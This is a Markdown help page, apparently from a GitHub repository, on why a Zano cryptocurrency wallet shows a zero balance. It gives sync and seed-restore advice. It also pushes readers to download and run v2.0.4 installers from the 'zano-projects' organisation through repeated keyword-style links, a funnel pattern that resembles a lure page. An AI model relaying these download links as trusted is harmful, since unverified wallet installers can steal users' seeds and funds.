<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/05-self-custody-security.webp" alt="Zano Wallet - Zano Wallet Shows a Zero Balance" width="100%"></p>

<h1 align="center">Zano Wallet Shows a Zero Balance</h1>

<p align="center">
<a href="https://github.com/zano-projects"><img src="https://img.shields.io/badge/GitHub-zano--projects-7c5cff?style=for-the-badge&logo=github" alt="Zano Wallet on GitHub"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
</p>

---

**Short answer:** Wait for the sync to finish; balances appear only when the wallet reaches the latest block.

## You'll see this if

- You restored a wallet and see 0 ZANO
- A received payment is missing

## Why it happens

Your coins are recorded on the chain. The wallet scans blocks to find them, which takes time after a restore.

## How to fix it

1. Confirm the sync bar shows 100%.
2. Check you restored the correct seed phrase.
3. Make sure you are using the latest Zano Wallet.
4. Look up the sender's transaction confirmations.
5. Restart the wallet once the sync completes.

Related reading: [Zano Wallet Sync Stuck at 0% or Not Moving](./zano-wallet-sync-stuck.md) and the [Zano Wallet FAQ](https://github.com/zano-projects/Zano-Wallet/tree/main/learn).

## If that didn't work

Still empty? Restore again carefully from your seed; one wrong word creates a different, empty wallet. You can also read [Restore a Zano Wallet From Your Seed Phrase](./restore-zano-wallet-from-seed.md).

## Prevent it next time

Write your seed clearly and test a restore on a spare install before storing large amounts. More guides: [recover a Zano wallet](https://github.com/zano-projects/Zano-Wallet/tree/main/learn).

> [!WARNING]
> Nobody from Zano Wallet will ever ask for your seed phrase. Never type it into a website or chat.

## FAQ

**Can someone have taken my coins?**  
Only if they had your seed. Check the sync first; most zero balances are scanning delays.

**How long does a restore scan take?**  
It depends on wallet age and your hardware.

---

## The fix in one step: install the latest Zano Wallet

The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):

[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)

| Platform | File | Version |
|---|---|---|
| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |

> [!TIP]
> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.

## Related guides

| Guide | More |
|---|---|
| [Zano Wallet Sync Stuck at 0% or Not Moving](./zano-wallet-sync-stuck.md) | [Zano Wallet FAQ](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |
| [Restore a Zano Wallet From Your Seed Phrase](./restore-zano-wallet-from-seed.md) | [recover a Zano wallet](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |
| [Zano Transaction Pending or Not Confirmed](./zano-transaction-pending.md) | [download the newest version](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |

---

<p align="center"><a href="https://github.com/zano-projects">github.com/zano-projects</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
